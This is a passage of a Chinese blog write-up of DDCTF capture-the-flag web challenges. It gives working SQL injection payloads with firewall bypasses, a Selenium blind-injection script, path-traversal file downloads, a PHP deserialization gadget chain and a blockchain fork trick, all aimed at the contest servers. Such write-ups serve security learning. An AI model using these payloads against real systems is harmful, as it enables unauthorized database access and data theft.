class=\"headerlink\" title=\"X-forwarded-for\"></a>X-forwarded-for</h2><p>首先打开网页，可以看到”非法链接，只允许来自 123.232.23.245 的访问”,很容易就想到修改X-forwarded-for, Chrome下我使用<a href=\"https://chrome.google.com/webstore/search/modheader?hl=zh-CN\" target=\"_blank\" rel=\"noopener\">Modheader</a>插件,然后修改一下X-forwarded-for就行了</p>\n<h2 id=\"寻找注入点\"><a href=\"#寻找注入点\" class=\"headerlink\" title=\"寻找注入点\"></a>寻找注入点</h2><p>既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。</p>\n<ul>\n<li>id 无论输入什么，都会被转化为数字或者为空，应该是用了intval()，不存在注入点。</li>\n<li>title和date均过滤了单引号，双引号，右斜杠，宽字节也不好使，估计也不好注入。</li>\n<li>author<ul>\n<li>“admin”, 会得到author 为 “admin” 的两条记录</li>\n<li>“admin’”, 一条记录都没有</li>\n<li>“admin’#”, 同样会得到author 为 “admin” 的两条记录，那注入点应该就是这里了。</li>\n<li>“admin’ and 1=1#”, 发现会有网站防火墙拦截，应该是”and”被拦截，可以使用”&amp;&amp;”来替换”and”,然后，同样会查询出两条记录。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>找到注入点之后，就好办了。</p>\n<ul>\n<li>“admin’ order by 6#”, 失败，”admin’ order by 5#”，成功查询，那就是5列了。 </li>\n<li>“admin’ union select 1,2,3,4,5#”, 被防火墙拦截，然后就是各种测试”union select”,没能成功绕过(比赛结束之后，有师傅说可以绕过，<a href=\"https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md\" target=\"_blank\" rel=\"noopener\">链接</a>，由兴趣的小伙伴可以尝试一下)。那就尝试bool注入了。</li>\n<li>“admin’ &amp;&amp; 1=(substr((select group_concat(schema_name) from information_schema.schemata),1,1)&lt;’z’)#”,成功拿到数据，接下来就是写脚本拿flag了。<br>脚本如下:</li>\n</ul>\n<pre><code>import time\nfrom selenium import webdriver\nimport string\n\nstrings = string.ascii_letters + string.punctuation + string.digits\nstring_value = &quot;,0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}&quot;\nurl=&quot;http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php&quot;\npath=&quot;D:\\\\python\\\\chromedriver.exe&quot;\ndriver = webdriver.Chrome(executable_path=path)\npayload = &quot;admin&#39; &amp;&amp; 1=(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)=&#39;%s&#39;)#&quot;\npayload_table = &quot;admin&#39; &amp;&amp; 1=(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;ddctf&#39;),%d,1)=&#39;%s&#39;)#&quot;\npayload_column = &quot;admin&#39; &amp;&amp; 1=(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctf_key7&#39;),%d,1)=&#39;%s&#39;)#&quot;\npayload_value = &quot;admin&#39; &amp;&amp; 1=(ord(substr((select group_concat(secvalue) from ddctf.ctf_key7),%d,1))=ord(&#39;%s&#39;))#&quot;\n\ndef inject():\n    data = &quot;&quot;\n\n    driver.get(url)\n    input(&quot;jixu:&quot;)\n    judge = True\n    index = 1\n    while judge:\n        judge_temp = False\n        for i in string_value:\n            payload_temp = payload_value % (index, i)\n            print(payload_temp)\n            driver.get(url)\n            driver.execute_script(&#39;document.getElementById(&quot;author&quot;).type=&quot;text&quot;&#39;)\n            driver.find_element_by_id(&quot;author&quot;).send_keys(payload_temp)\n            driver.find_element_by_id(&quot;button&quot;).click()\n            if &quot;admin&quot; in driver.page_source:\n                data += i\n                index += 1\n                judge_temp = True\n                print(data)\n                break\n            time.sleep(1)\n        if judge_temp is not True:\n            driver.close()\n            judge = False\n\ninject(payload_value)\n# table_schema:  ddctf\n# tables: ctf_key7, message\n# columns: ctf_key7下: secvalue，flag就保存在sevalue里边\n</code></pre><h2 id=\"注意点\"><a href=\"#注意点\" class=\"headerlink\" title=\"注意点\"></a>注意点</h2><ul>\n<li><p>每次请求时，js都会计算一个sig值和time值，计算方法在main.js中<br><code><br>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseint(c a)))+((c=\"c%a)\">35?String.fromCharCode(c+29):c.toString(36))};if(!’’.replace(/^/,String)){while(c–)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return’\\w+’};c=1;};while(c–)if(k[c])p=p.replace(new RegExp(‘\\b’+e(c)+’\\b’,’g’),k[c]);return p;}(‘e f(0,4){5 7=\\’\\’;l(i m 0){n(i!=\\’c\\’){a=\\’\\’;a=i+\\’=\\’+0[i];7+=a}}o k(7+4)};5 0={8:\\’\\’,9:\\’\\’,b:\\’\\’,6:\\’\\’,d:h(j v().u()/w)};e x(){0[\\’8\\’]=1.2(\\’8\\’).3;0[\\’9\\’]=1.2(\\’9\\’).3;0[\\’b\\’]=1.2(\\’b\\’).3;0[\\’6\\’]=1.2(\\’6\\’).3;5 c=f(0,4);1.2(\\’g\\’).q=”p.s?r=”+c+”&amp;d=”+0.d;1.2(\\’g\\’).t()}’,34,34,’obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt’.split(‘|’),0,{}))<br></a?\"\":e(parseint(c></code><br>看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。</p>\n</li>\n<li><p>由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:</p>\n</li>\n</ul>\n<pre><code>driver.get(url)\ninput(&quot;jixu:&quot;)\n</code></pre><p>首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装<a href=\"https://chrome.google.com/webstore/search/modheader?hl=zh-CN\" target=\"_blank\" rel=\"noopener\">Modheader</a>插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。</p>\n<h1 id=\"专属链接\"><a href=\"#专属链接\" class=\"headerlink\" title=\"专属链接\"></a>专属链接</h1><h2 id=\"任意文件下载\"><a href=\"#任意文件下载\" class=\"headerlink\" title=\"任意文件下载\"></a>任意文件下载</h2><p>首先F12抓包，会看到一个有意思的请求，<a href=\"http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you\" target=\"_blank\" rel=\"noopener\">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you</a> can only download .class .xml .ico .ks files”,表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。</p>\n<p><img src=\"/images/ddctf/20180421191033.png\" alt=\"avatar\"></p>\n<p>其中需要注意的有三个文件，</p>\n<ul>\n<li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造”116.85.48.102:5050/flag/test/flag/DDCTF{BASD}”或类似的链接使得网站报错即可得到。</p>\n<p><img src=\"/images/ddctf/201804211191034.png\" alt=\"avatar\"></p>\n</li>\n<li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造”116.85.48.102:5050/image/banner/[随便一个错误的地址]”或类似的链接使得网站报错即可得到。</p>\n<p><img src=\"/images/ddctf/20180421191037.png\" alt=\"avatar\"></p>\n</li>\n<li><p>_.._WEB-INF_classes_emails.txt<em>a__</em>,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过”116.85.48.102:5050/base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)”,(注意，base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。</p>\n</li>\n</ul>\n<h2 id=\"审计代码\"><a href=\"#审计代码\" class=\"headerlink\" title=\"审计代码\"></a>审计代码</h2><p>下载下来的class文件，通过Intellij idea打开，就可以直接得到反编译之后的代码了。<br>其中最重要的两个文件是FlagController.class和InitListener.class。</p>\n<ul>\n<li>FlagController.class</li>\n</ul>\n<pre><code>public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) {\n        Flag flag = this.flagService.getFlagByEmail(email);\n        return &quot;Encrypted flag : &quot; + flag.getFlag();\n    }\n</code></pre><p>在该文件中，可以得到一个获取加密后的flag的路由，需要一个邮箱，当然该邮箱也是加密之后的邮箱，如何加密邮箱，可以在InitListener.class中看到。</p>\n<ul>\n<li>InitListener.class</li>\n</ul>\n<pre><code>public void onApplicationEvent(ApplicationEvent event) {\n        if(event.getSource() instanceof ApplicationContext) {\n            WebApplicationContext ctx = (WebApplicationContext)event.getSource();\n            if(ctx.getParent() == null) {\n                String regenflag = this.properties.getProperty(&quot;regenflag&quot;);\n                if(regenflag != null &amp;&amp; &quot;false&quot;.equals(regenflag)) {\n                    System.out.println(&quot;skip gen flag&quot;);\n                } else {\n                    try {\n                        this.flagService.deleteAll();\n                        int id = 1;\n                        String path = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/emails.txt&quot;);\n                        String ksPath = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/sdl.ks&quot;);\n                        System.out.println(path);\n                        String emailsString = FileUtils.readFileToString(new File(path), &quot;utf-8&quot;);\n                        String[] emails = emailsString.trim().split(&quot;\\n&quot;);\n                        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n                        FileInputStream inputStream = new FileInputStream(ksPath);\n                        keyStore.load(inputStream, this.p.toCharArray());\n                        Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, this.p.toCharArray());\n                        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n                        cipher.init(1, key);\n                        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);\n                        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);\n                        mac.init(signingKey);\n                        SecureRandom sr = new SecureRandom();\n                        String[] var16 = emails;\n                        int var17 = emails.length;\n\n                        for(int var18 = 0; var18 &lt; var17; ++var18) {\n                            String email = var16[var18];\n                            String flag = &quot;DDCTF{&quot; + Math.abs(sr.nextLong()) + &quot;}&quot;;\n                            String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);\n                            byte[] data = cipher.doFinal(flag.getBytes());\n                            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n                            Flag flago = new Flag();\n                            flago.setId(Integer.valueOf(id));\n                            flago.setFlag(byte2hex(data));\n                            flago.setEmail(byte2hex(e));\n                            flago.setOriginFlag(flag);\n                            flago.setUuid(uuid);\n                            flago.setOriginEmail(email);\n                            this.flagService.save(flago);\n                            System.out.println(email + &quot;同学的入口链接为：http://116.85.48.102:5050/welcom/&quot; + uuid);\n                            ++id;\n                            System.out.println(flago);\n                        }\n                    } catch (KeyStoreException var25) {\n                        var25.printStackTrace();\n                    } catch (IOException var26) {\n                        var26.printStackTrace();\n                    } catch (NoSuchAlgorithmException var27) {\n                        var27.printStackTrace();\n                    } catch (CertificateException var28) {\n                        var28.printStackTrace();\n                    } catch (UnrecoverableKeyException var29) {\n                        var29.printStackTrace();\n                    } catch (NoSuchPaddingException var30) {\n                        var30.printStackTrace();\n                    } catch (InvalidKeyException var31) {\n                        var31.printStackTrace();\n                    } catch (IllegalBlockSizeException var32) {\n                        var32.printStackTrace();\n                    } catch (BadPaddingException var33) {\n                        var33.printStackTrace();\n                    }\n\n                }\n            }\n        }\n    }\n</code></pre><p>该文件中onApplicationEvent方法意思是，在应用启动之后，首先判断是否需要生成flag，如果需要生成flag，然后读取email.txt里边的邮箱一一加密，同时生成flag，并保存到数据库中。只要可以得到加密后的email.txt就可以获得加密后的flag，并通过相应的sdl.ks获取公钥，最终解密加密后的flag即可得到flag了。</p>\n<h2 id=\"获取flag\"><a href=\"#获取flag\" class=\"headerlink\" title=\"获取flag\"></a>获取flag</h2><ul>\n<li>生成加密的email，随便在email.txt中获取一条email，或者首页的邮箱。</li>\n</ul>\n<pre><code>public class cipher {\n    public static  void main(String[] args) throws Exception {\n        gencipher();\n//        String email = &quot;email&quot;;\n//        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);\n//        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n    }\n\n    public static void gencipher() throws Exception {\n        String p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);\n        String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n//        Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, p.toCharArray());\n        Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = &quot;019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE&quot;;\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n\n    public static String byte2hex(byte[] b) {\n        StringBuilder hs = new StringBuilder();\n\n        for(int n = 0; b != null &amp;&amp; n &lt; b.length; ++n) {\n            String stmp = Integer.toHexString(b[n] &amp; 255);\n            if(stmp.length() == 1) {\n                hs.append(&#39;0&#39;);\n            }\n\n            hs.append(stmp);\n        }\n\n        return hs.toString().toUpperCase();\n    }\n\n    public static byte[] hexStringToBytes(String hexString) {\n        if (hexString == null || hexString.equals(&quot;&quot;)) {\n            return null;\n        }\n        hexString = hexString.toUpperCase();\n        int length = hexString.length() / 2;\n        char[] hexChars = hexString.toCharArray();\n        byte[] d = new byte[length];\n        for (int i = 0; i &lt; length; i++) {\n            int pos = i * 2;\n            d[i] = (byte) (charToByte(hexChars[pos]) &lt;&lt; 4 | charToByte(hexChars[pos + 1]));\n        }\n        return d;\n    }\n\n    private static byte charToByte(char c) {\n        return (byte) &quot;0123456789ABCDEF&quot;.indexOf(c);\n    }\n}\n</code></pre><p>通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。</p>\n<pre><code>//        String email = &quot;email&quot;;\n//        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);\n//        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n</code></pre><p>拿到该加密后的邮箱，就可以获得加密后的flag。</p>\n<p> <img src=\"/images/ddctf/20180421191047.png\" alt=\"avatar\"></p>\n<p>拿到加密之后的flag之后，就可以解密了。</p>\n<pre><code>public static void gencipher() throws Exception {\n        String p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);\n        String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n        Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = &quot;019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE&quot;;\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n</code></pre><p>该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可</p>\n<pre><code>String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nFileInputStream inputStream = new FileInputStream(ksPath);\nkeyStore.load(inputStream, p.toCharArray());\nKey key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();\n</code></pre><p>然后就可以解密得到flag.</p>\n<blockquote>\n<p>DDCTF{5218295657878818503}</p>\n</blockquote>\n<h1 id=\"注入的奥妙\"><a href=\"#注入的奥妙\" class=\"headerlink\" title=\"注入的奥妙\"></a>注入的奥妙</h1><h2 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h2><p>首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号”‘“，发现输出竟然乱码。</p>\n<p> <img src=\"/images/ddctf/20180421195946.png\" alt=\"avatar\"></p>\n<p> 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。</p>\n<p> <img src=\"/images/ddctf/20180421200130.png\" alt=\"avatar\"></p>\n<p> 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（<a href=\"https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。\" target=\"_blank\" rel=\"noopener\">https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。</a></p>\n<p> <img src=\"/images/ddctf/20180421200307.png\" alt=\"avatar\"></p>\n<p> 我选择了”么”</p>\n<p> <img src=\"/images/ddctf/20180421200748.png\" alt=\"avatar\"></p>\n<p> 通过测试”<a href=\"http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88&#39;&quot;，可以看到单引号成功逃逸。\" target=\"_blank\" rel=\"noopener\">http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88&#39;&quot;，可以看到单引号成功逃逸。</a></p>\n<pre><code>\n 最后拼接的参数是 : ?\\\\&#39;\n​~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~\n很遗憾没有找到数据 可以试试别的 ！\n42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;?\\\\&#39;&#39;&#39; at line 1\n</code></pre><p>单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加”collate utf8_general_cli”,强制转换编码即可。</p>\n<ul>\n<li>获取数据库。<a href=\"http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88&#39;%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23\" target=\"_blank\" rel=\"noopener\">http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88&#39;%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23</a><br> 得到结果”sqli”</li>\n<li>获取’sqli’下的table。<a href=\"http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么\" target=\"_blank\" rel=\"noopener\">http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么</a>‘ uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23<br> 得到结果”message,route_rules”</li>\n<li>获取”route_rules”的列名。<a href=\"http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么\" target=\"_blank\" rel=\"noopener\">http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么</a>‘ uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23<br> 得到结果”id,pattern,action,rulepass”</li>\n<li>然后获取route_rules表中的数据。<br> 数据如下:<br> 1   get<em>/   u/well/getmessage/<br> 12  get</em>/   u/justtry/self/<br> 13  post*/  u/justtry/try<br> 15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip</li>\n</ul>\n<h2 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h2><p>通过上边的”116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css”，可以拿到代码。</p>\n<ul>\n<li>Jusstry.php</li>\n</ul>\n<pre><code>public function try($serialize)\n{\n    unserialize(urldecode($serialize), [&quot;allowed_classes&quot; =&gt; [&quot;Index\\Helper\\Flag&quot;, &quot;Index\\Helper\\SQL&quot;,&quot;Index\\Helper\\Test&quot;]]);\n}\n</code></pre><p>通过这段代码，可以看到使用了unserialize()方法，可能存在反序列化漏洞。</p>\n<ul>\n<li>Flag.php</li>\n</ul>\n<pre><code>&lt;?php\nnamespace Index\\Helper;\n\nuse PDO;\nuse Index\\Helper\\SQL;\n\ndefined(&#39;ACCESS_FILE&#39;) or exit(&#39;No direct script access allowed&#39;);\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this-&gt;sql=new SQL();\n    }\n\n    //\n    public function get($user)\n    {\n\n        $tmp=$this-&gt;sql-&gt;FlagGet($user);\n        if ($tmp[&#39;status&#39;]===1) {\n            return $this-&gt;sql-&gt;FlagGet($user)[&#39;flag&#39;];\n        }\n    }\n}\n</code></pre><p>该类说明只要调用get方法就可以得到指定用户的flag。</p>\n<ul>\n<li>Test.php</li>\n</ul>\n<pre><code>class Test\n{\n\n    public $user_uuid = &quot;4f5aa917-e388-4aa5-bcdc-125b9b95e12a&quot;;\n    public $fl;\n\n    public function __construct()\n    {\n        echo &#39;hhkjjhkhjkhjkhkjhkhkhk&#39;;\n        $this-&gt;fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        $this-&gt;getflag(&#39;ctfuser&#39;, $this-&gt;user_uuid);\n    }\n\n    public function setflag($m = &#39;ctfuser&#39;, $u = &#39;default&#39;, $o = &#39;default&#39;)\n    {\n        $user=array(\n            &#39;name&#39; =&gt; $m,\n            &#39;oldid&#39; =&gt; $o,\n            &#39;id&#39; =&gt; $u\n        );\n        // var_dump($user);\n\n        echo $this-&gt;fl-&gt;set($user, 2);\n    }\n\n    public function getflag($m = &#39;ctfuser&#39;, $u = &#39;default&#39;)\n    {\n        //TODO: check username\n        $user=array(\n            &#39;name&#39; =&gt; $m,\n            &#39;id&#39; =&gt; $u\n        );\n        //懒了直接输出给你们了\n        echo &#39;DDCTF{&#39;.$this-&gt;fl-&gt;get($user).&#39;}&#39;;\n    }\n}\n</code></pre><p>在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid=”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。</p>\n<pre><code>&lt;?php\nnamespace Index\\Helper;\n\nuse Index\\Helper\\Flag;\nuse Index\\Helper\\UUID;\n\nclass SQL\n{\n    public $dbc;\n    public $pdo;\n\n    //\n    public function __construct()\n    {\n    }\n}\n\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this-&gt;sql=new SQL();\n    }\n}\n\n\n// defined(&#39;ACCESS_FILE&#39;) or exit(&#39;No direct script access allowed&#39;);\nclass Test\n{\n\n    public $user_uuid = &quot;4f5aa917-e388-4aa5-bcdc-125b9b95e12a&quot;;\n    public $fl;\n\n    public function __construct()\n    {\n        echo &#39;hhkjjhkhjkhjkhkjhkhkhk&#39;;\n        $this-&gt;fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        // $this-&gt;getflag(&#39;ctfuser&#39;, $this-&gt;user_uuid);\n    }\n}\n\necho serialize(new Test());\n</code></pre><p>即可得到序列化之后的值:”hhkjjhkhjkhjkhkjhkhkhkO:17:”Index\\Helper\\Test”:2:{s:9:”user_uuid”;s:36:”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”;s:2:”fl”;O:17:”Index\\Helper\\Flag”:1:{s:3:”sql”;O:16:”Index\\Helper\\SQL”:2:{s:3:”dbc”;N;s:3:”pdo”;N;}}}”,然后就可以得到flag了。</p>\n<p> <img src=\"/images/ddctf/20180421150038.png\" alt=\"avatar\"></p>\n<h1 id=\"mini-blockchain\"><a href=\"#mini-blockchain\" class=\"headerlink\" title=\"mini blockchain\"></a>mini blockchain</h1><h2 id=\"构造符合条件的区块\"><a href=\"#构造符合条件的区块\" class=\"headerlink\" title=\"构造符合条件的区块\"></a>构造符合条件的区块</h2><pre><code>import json\nimport hashlib\nfrom itertools import product\nimport string\nfrom functools import reduce\nimport rsa\n\nEMPTY_HASH = &#39;0&#39; * 64\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()\n\n\ndef hash_reducer(x, y):\n    return hash(hash(x) + hash(y))\n\n\ndef hash_block(block):\n    return reduce(hash_reducer, [block[&#39;prev&#39;], block[&#39;nonce&#39;],\n                                 reduce(hash_reducer, [tx[&#39;hash&#39;] for tx in block[&#39;transactions&#39;]], EMPTY_HASH)])\n\nblock = {\n    &quot;nonce&quot;: &quot;6h0F&quot;,\n    &quot;prev&quot;: &quot;0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8&quot;,\n    &quot;transactions&quot;: []\n  }\n\nc = string.ascii_lowercase + &quot;0123456789ABCDEFGHI&quot;\n\ncaptchas = [&#39;&#39;.join(i) for i in product(c, repeat=4)]\n\nprint(&#39;[+] Genering {} captchas...&#39;.format(len(captchas)))\nwith open(&#39;captchas.txt&#39;, &#39;w&#39;) as f:\n    for k in captchas:\n        block[&quot;nonce&quot;] = k\n        f.write(hash_block(block)[:5] + &#39; --&gt; &#39; + k + &#39;\\n&#39;)\n</code></pre><p>“nonce”值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。</p>\n<h2 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h2><p>初始区块链如图所示:</p>\n<p> <img src=\"/images/ddctf/20180421221550.png\" alt=\"avatar\"></p>\n<p>然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block[‘height’]来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。</p>\n<pre><code>def find_blockchain_tail():\n    return max(session[&#39;blocks&#39;].values(), key=lambda block: block[&#39;height&#39;])\n</code></pre><p> <img src=\"/images/ddctf/20180421222032.png\" alt=\"avatar\"></p>\n<p>从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。</p>\n<p> <img src=\"/images/ddctf/20180421222814.png\" alt=\"avatar\"></p>\n<p>接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。</p>\n<p> <img src=\"/images/ddctf/20180421223014.png\" 